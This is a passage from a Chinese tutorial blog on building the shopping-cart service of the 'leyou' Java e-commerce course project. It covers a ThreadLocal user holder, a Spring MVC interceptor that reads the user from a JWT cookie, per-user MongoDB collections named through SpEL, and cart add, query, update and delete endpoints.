<li>缺点：不安全，因为调用购物车CRUD的请求是从页面发过来的，我们不能确定这个传递来的id是不是真的是用户的id</li>
</ul>
</li>
<li>方式二：自己从cookie的token中解析用户信息<ul>
<li>优点：安全</li>
<li>缺点：<ul>
<li>需要重复校验JWT，已经在网关中做过了</li>
<li>代码麻烦</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>安全第一，我们选择方式二，如何解决重复校验的问题呢？我们微服务内部可以只解析用户信息，JWT的安全校验。</p>
<p>为了在请求进入服务后直接能拿到用户，我们可以拦截每一个进入controller的请求，统一完成登录用户的获取，这个拦截可以通过SpringMVC的通用拦截器：HandlerInterceptor来实现。</p>
<h4 id="ThreadLocal"><a href="#ThreadLocal" class="headerlink" title="ThreadLocal"></a>ThreadLocal</h4><p>当获取用户信息后，我们需要把用户保存起来，方便后面的业务使用。那么保存用户信息到哪里呢？</p>
<p>每次请求都有不同的用户信息，在并发请求情况下，必须保证每次请求保存的用户信息互不干扰，线程独立。也就是说，需要把<strong>用户与每一个请求线程绑定</strong>。</p>
<p>注意：这里不是<strong>解决多线程资源共享问题，而是要保证每个线程都有自己的用户资源，互不干扰</strong>。</p>
<p>而JDK中提供的<code>ThreadLocal</code>恰好满足这个需求，那么ThreadLocal是如何实现这一需求的呢？</p>
<p>看下这幅图：</p>
<p>  <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022707.png" alt="1554964371849"></p>
<p>关键点：</p>
<ul>
<li>每个线程（<code>Thread</code>）内部都持有一个<code>ThreadLocalMap</code>对象。</li>
<li><code>ThreadLocalMap</code>的Key是某个<code>ThreadLocal</code>对象，值是任意Object。</li>
<li>不同线程，内部有自己的<code>ThreadLocalMap</code>，因此各线程资源互相不会干扰。</li>
</ul>
<p>下面我们定义容器，存储用户数据。在<code>ly-trade</code>的<code>com.leyou.trade.utils</code>包中，定义类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.utils;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserHolder</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;Long&gt; TL = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setUser</span><span class="params">(Long userId)</span> &#123;</span><br><span class="line">        TL.set(userId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Long <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Long</span> <span class="variable">id</span> <span class="operator">=</span> TL.get();</span><br><span class="line">        <span class="keyword">if</span>(id == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 不存在时返回默认值</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">removeUser</span><span class="params">()</span> &#123;</span><br><span class="line">        TL.remove();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="mvc拦截器"><a href="#mvc拦截器" class="headerlink" title="mvc拦截器"></a>mvc拦截器</h4><p>最后一步，定义SpringMVC的拦截器，在拦截器中获取用户信息，并保存到ThreadLocal中即可。</p>
<p>在<code>ly-trade</code>的<code>com.leyou.trade.interceptors</code>中定义拦截器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.interceptors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.UserTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.exception.LyException;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.CookieUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.utils.UserHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.获取token</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, UserTokenConstants.COOKIE_NAME);</span><br><span class="line">        <span class="comment">// 2.从token中解析用户</span></span><br><span class="line">        Payload&lt;UserInfo&gt; payload = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            payload = JwtUtils.getInfoFromToken(token, UserInfo.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;用户不能为空&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">        <span class="comment">// 3.保存用户</span></span><br><span class="line">        UserHolder.setUser(userInfo.getId());</span><br><span class="line">        <span class="comment">// 4.放行</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> &#123;</span><br><span class="line">        <span class="comment">// 5.清除用户</span></span><br><span class="line">        UserHolder.removeUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，在<code>ly-trade</code>的<code>com.leyou.trade.config</code>包中配置拦截器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.interceptors.UserInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MvcConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">UserInterceptor</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="动态集合名词"><a href="#动态集合名词" class="headerlink" title="动态集合名词"></a>动态集合名词</h4><p>我们计划为<strong>每个用户创建一个集合，作为这个用户的购物车</strong>，用户id作为集合名一部分。而集合名称是通过注解在实体类上声明的，如何才能在注解中动态获取当前用户的信息呢？</p>
<p>SpringDataMongoDB中的@Document注解是支持spEL表达式的，因此我们可以通过spEL来调用UserHolder中的方法，获取用户信息。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.annotation.Id;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.mongodb.core.mapping.Document;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Document(collection = &quot;cart_user_#&#123;T(com.leyou.trade.utils.UserHolder).getUser()&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CartItem</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> Long skuId;<span class="comment">// 商品id</span></span><br><span class="line">    <span class="keyword">private</span> String title;<span class="comment">// 标题</span></span><br><span class="line">    <span class="keyword">private</span> String image;<span class="comment">// 图片</span></span><br><span class="line">    <span class="keyword">private</span> Long price;<span class="comment">// 加入购物车时的价格</span></span><br><span class="line">    <span class="keyword">private</span> Integer num;<span class="comment">// 购买数量</span></span><br><span class="line">    <span class="keyword">private</span> String spec;<span class="comment">// 商品规格参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>集合名称中的spEL语法说明：</p>
<p><code>&quot;cart_user_#&#123;T(com.leyou.trade.utils.UserHolder).getUser()&#125;&quot;</code></p>
<ul>
<li><code>cart_user_</code>：普通字符串</li>
<li><code>#&#123;&#125;</code>：代表spEL表达式</li>
<li><code>T(com.leyou.trade.utils.UserHolder).getUser()</code>：调用<code>UserHolder</code>的静态方法<code>getUser()</code></li>
</ul>
<h3 id="添加商品到购物车"><a href="#添加商品到购物车" class="headerlink" title="添加商品到购物车"></a>添加商品到购物车</h3><h4 id="页面发起请求："><a href="#页面发起请求：" class="headerlink" title="页面发起请求："></a>页面发起请求：</h4><p>我们再次回到商品详情页，登录以后，点击加入购物车，发现控制台发起了请求：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022708.png" alt="image-20200323204008804"></p>
<p>请求分析：</p>
<ul>
<li>请求方式：Post</li>
<li>请求路径：&#x2F;cart </li>
<li>请求参数：Json对象，包含购物车的所有属性，我们可以用CartItem接收</li>
<li>返回结果：无</li>
</ul>
<h4 id="后台添加购物车"><a href="#后台添加购物车" class="headerlink" title="后台添加购物车"></a>后台添加购物车</h4><p>首先新建一个操作MongoDB的Repository，在<code>ly-trade</code>的<code>com.leyou.trade.repository</code>包下，添加一个接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.repository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.entity.CartItem;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.mongodb.repository.MongoRepository;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CartRepository</span> <span class="keyword">extends</span> <span class="title class_">MongoRepository</span>&lt;CartItem, Long&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>然后在<code>ly-trade</code>的<code>com.leyou.trade.service</code>包中添加<code>CartService</code>接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.entity.CartItem;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CartService</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 新增购物车</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cartItem 购物车商品</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">saveCartItem</span><span class="params">(CartItem cartItem)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在<code>ly-trade</code>的<code>com.leyou.trade.service.impl</code>包中添加<code>CartServiceImpl</code>实现类：</p>
<p>这里我们不访问数据库，而是直接操作MongoDB。基本思路：</p>
<ul>
<li>先查询之前的购物车数据</li>
<li>判断要添加的商品是否存在<ul>
<li>存在：则直接修改数量，写入MongoDB</li>
<li>不存在：直接写入MongoDB</li>
</ul>
</li>
</ul>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.entity.CartItem;</span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.repository.CartRepository;</span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.service.CartService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CartServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">CartService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CartRepository repository;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CartServiceImpl</span><span class="params">(CartRepository repository)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.repository = repository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCartItem</span><span class="params">(CartItem cartItem)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.先获取之前的购物车数据</span></span><br><span class="line">        Optional&lt;CartItem&gt; optional = repository.findById(cartItem.getSkuId());</span><br><span class="line">        <span class="comment">// 2.判断是否存在</span></span><br><span class="line">        <span class="keyword">if</span>(optional.isPresent())&#123;</span><br><span class="line">            <span class="comment">// 2.1.存在，记录新的商品数量</span></span><br><span class="line">            <span class="type">Integer</span> <span class="variable">num</span> <span class="operator">=</span> cartItem.getNum();</span><br><span class="line">            <span class="comment">// 2.2.获取旧的数据</span></span><br><span class="line">            cartItem = optional.get();</span><br><span class="line">            <span class="comment">// 2.3.数量累加</span></span><br><span class="line">            cartItem.setNum(num + cartItem.getNum());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.写入db</span></span><br><span class="line">        repository.save(cartItem);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们在<code>ly-trade</code>的<code>com.leyou.trade.web</code>包中添加新的controller：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.entity.CartItem;</span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.service.CartService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;cart&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CartController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CartService cartService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CartController</span><span class="params">(CartService cartService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cartService = cartService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 新增购物车</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> cartItem 购物车数据</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 无</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">saveCartItem</span><span class="params">(<span class="meta">@RequestBody</span> CartItem cartItem)</span>&#123;</span><br><span class="line">        cartService.saveCartItem(cartItem);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(HttpStatus.CREATED).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>登录后，在商品页面再次点击添加购物车，结果如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022709.png" alt="image-20200323220810325"></p>
<h3 id="查询购物车"><a href="#查询购物车" class="headerlink" title="查询购物车"></a>查询购物车</h3><h4 id="页面发起请求"><a href="#页面发起请求" class="headerlink" title="页面发起请求"></a>页面发起请求</h4><p>我们进入购物车列表页面，然后刷新页面，查看控制台的请求：</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022710.png" alt="image-20200323220905668"></p>
<h4 id="后台实现"><a href="#后台实现" class="headerlink" title="后台实现"></a>后台实现</h4><p>请求分析：</p>
<ul>
<li>请求方式：Get</li>
<li>请求路径：&#x2F;cart&#x2F;list</li>
<li>请求参数：无</li>
<li>返回结果：当前用户的购物车集合</li>
</ul>
<p>然后在<code>ly-trade</code>的<code>com.leyou.trade.service</code>包中<code>CartService</code>接口添加方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询用户的购物车商品集合</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 购物车商品集合</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">List&lt;CartItem&gt; <span class="title function_">queryCartList</span><span class="params">()</span>;</span><br></pre></td></tr></table></figure>

<p>然后在<code>ly-trade</code>的<code>com.leyou.trade.service.impl</code>包中<code>CartServiceImpl</code>实现类中添加方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> List&lt;CartItem&gt; <span class="title function_">queryCartList</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> repository.findAll();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们在<code>ly-trade</code>的<code>com.leyou.trade.web</code>包中的<code>CartController</code>中添加新的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询购物车列表</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 购物车商品列表</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;List&lt;CartItem&gt;&gt; <span class="title function_">queryCartList</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok(cartService.queryCartList());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="修改商品数量"><a href="#修改商品数量" class="headerlink" title="修改商品数量"></a>修改商品数量</h3><h4 id="页面发起请求-1"><a href="#页面发起请求-1" class="headerlink" title="页面发起请求"></a>页面发起请求</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022711.png" alt="image-20200323223106917"> </p>
<p>页面请求分析：</p>
<ul>
<li>请求方式：PUT</li>
<li>请求路径：&#x2F;cart</li>
<li>请求参数：<ul>
<li>id: 商品skuId</li>
<li>num: 最终的数量</li>
</ul>
</li>
<li>返回结果：无</li>
</ul>
<h4 id="后台实现-1"><a href="#后台实现-1" class="headerlink" title="后台实现"></a>后台实现</h4><p>然后在<code>ly-trade</code>的<code>com.leyou.trade.service</code>包中<code>CartService</code>接口添加方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新购物车指定商品的数量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> skuId 商品id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> num 数量</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">updateNum</span><span class="params">(Long skuId, Integer num)</span>;</span><br></pre></td></tr></table></figure>

<p>然后在<code>ly-trade</code>的<code>com.leyou.trade.service.impl</code>包中<code>CartServiceImpl</code>实现类中添加方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateNum</span><span class="params">(Long skuId, Integer num)</span> &#123;</span><br><span class="line">    <span class="comment">// 查询以前的购物车数据</span></span><br><span class="line">    Optional&lt;CartItem&gt; optional = repository.findById(skuId);</span><br><span class="line">    <span class="comment">// 判断是否存在</span></span><br><span class="line">    <span class="keyword">if</span>(!optional.isPresent())&#123;</span><br><span class="line">        <span class="comment">// 不存在直接结束</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;商品不存在！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 存在则修改</span></span><br><span class="line">    <span class="type">CartItem</span> <span class="variable">cartItem</span> <span class="operator">=</span> optional.get();</span><br><span class="line">    cartItem.setNum(num);</span><br><span class="line">    repository.save(cartItem);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们在<code>ly-trade</code>的<code>com.leyou.trade.web</code>包中的<code>CartController</code>中添加新的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新购物车指定商品的数量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> skuId 商品id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> num 数量</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 无</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@PutMapping</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">updateNum</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="meta">@RequestParam(&quot;id&quot;)</span> Long skuId, <span class="meta">@RequestParam(&quot;num&quot;)</span> Integer num)</span> &#123;</span><br><span class="line">    cartService.updateNum(skuId, num);</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="删除购物车商品"><a href="#删除购物车商品" class="headerlink" title="删除购物车商品"></a>删除购物车商品</h3><h4 id="页面发起请求-2"><a href="#页面发起请求-2" class="headerlink" title="页面发起请求"></a>页面发起请求</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022712.png" alt="image-20200323223334102"> </p>
<p>页面请求分析：</p>
<ul>
<li>请求方式：DELETE</li>
<li>请求路径：&#x2F;cart&#x2F;{id}</li>
<li>请求参数：商品skuId</li>
<li>返回结果：无</li>
</ul>
<h4 id="后台实现-2"><a href="#后台实现-2" class="headerlink" title="后台实现"></a>后台实现</h4><p>然后在<code>ly-trade</code>的<code>com.leyou.trade.service</code>包中<code>CartService</code>接口添加方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 删除购物车指定商品</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> skuId 商品id</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">deleteCart</span><span class="params">(Long skuId)</span>;</span><br></pre></td></tr></table></figure>

<p>然后在<code>ly-trade</code>的<code>com.leyou.trade.service.impl</code>包中<code>CartServiceImpl</code>实现类中添加方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteCart</span><span class="params">(Long skuId)</span> &#123;</span><br><span class="line">    repository.deleteById(skuId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们在<code>ly-trade</code>的<code>com.leyou.trade.web</code>包中的<code>CartController</code>中添加新的方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除指定的购物车商品</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> skuId 商品id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 无</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@DeleteMapping(&quot;&#123;skuId&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">deleteCart</span><span class="params">(<span class="meta">@PathVariable(&quot;skuId&quot;)</span> Long skuId)</span> &#123;</span><br><span class="line">    cartService.deleteCart(skuId);</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="登录后购物车合并"><a href="#登录后购物车合并" class="headerlink" title="登录后购物车合并"></a>登录后购物车合并</h3><p>用户登录后，如果未登录下添加有购物车，则需要把未登录的购物车数据添加到已登录购物车列表中。</p>
<h4 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h4><p>基本流程如下：</p>
<ul>
<li><p>当跳转到购物车页面，查询购物车列表前，需要判断用户登录状态</p>
</li>
<li><p>如果登录：</p>
<ul>
<li>首先检查用户的LocalStorage中是否有购物车信息，</li>
<li>如果有，则提交到后台保存，</li>
<li>清空LocalStorage</li>
</ul>
</li>
<li><p>如果未登录，直接查询即可</p>
</li>
</ul>
<h4 id="前端页面"><a href="#前端页面" class="headerlink" title="前端页面"></a>前端页面</h4><p>先看一下现在的加载购物车的逻辑：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022713.png" alt="1554976355461"></p>
<p>我们需要在加载已登录购物车数据之前，新增一段判断逻辑：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022714.png" alt="1554976478290"></p>
<p>部分代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断本地未登录购物车是否存在，</span></span><br><span class="line"><span class="keyword">const</span> carts = ly.<span class="property">store</span>.<span class="title function_">get</span>(<span class="string">&quot;carts&quot;</span>) || [];</span><br><span class="line"><span class="keyword">if</span> (carts.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果存在，发到后台，添加到redis，删除本地购物车</span></span><br><span class="line">    ly.<span class="property">http</span>.<span class="title function_">post</span>(<span class="string">&quot;/trade/cart/list&quot;</span>, carts).<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 查询购物车</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">handleLoginCarts</span>();</span><br><span class="line">        <span class="comment">// 删除本地购物车</span></span><br><span class="line">        ly.<span class="property">store</span>.<span class="title function_">del</span>(<span class="string">&quot;carts&quot;</span>);</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 查询购物车</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">handleLoginCarts</span>();</span><br><span class="line">    &#125;)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 查询购物车</span></span><br><span class="line">    <span class="variable language_">this</span>.<span 